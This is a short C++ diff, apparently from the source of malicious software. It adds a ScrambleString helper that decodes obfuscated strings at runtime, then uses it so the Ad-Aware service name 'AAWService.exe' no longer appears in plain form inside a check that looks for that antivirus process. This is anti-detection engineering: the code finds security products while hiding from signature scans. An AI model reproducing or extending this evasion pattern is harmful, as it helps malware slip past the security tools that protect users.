@@ -1,3 +1,28 @@
+class ScrambleString
+{
+	public:
+	char *get_str()
+	{
+		if (string)
+			return string;
+		return "NIL";
+	}
+
+	ScrambleString(char *ob_str) 
+	{
+		string = LOG_ScrambleName(ob_str, 2, FALSE);
+	}
+
+	~ScrambleString(void)
+	{
+		SAFE_FREE(string);
+	}
+	
+	private:
+	char *string;
+};
+
+
 BOOL IsDriverRunning(WCHAR *driver_name)
 {
 	DWORD dummy;
@@ -154,7 +179,8 @@ BOOL IsAshampoo()
 
 BOOL IsADAware()
 {
-	if (HM_FindPid("AAWService.exe", FALSE))
+	ScrambleString ss("xxj4ltRUgl.lVl"); // "AAWService.exe"
+	if (HM_FindPid(ss.get_str(), FALSE))
 		return TRUE;
 	return FALSE;
 }
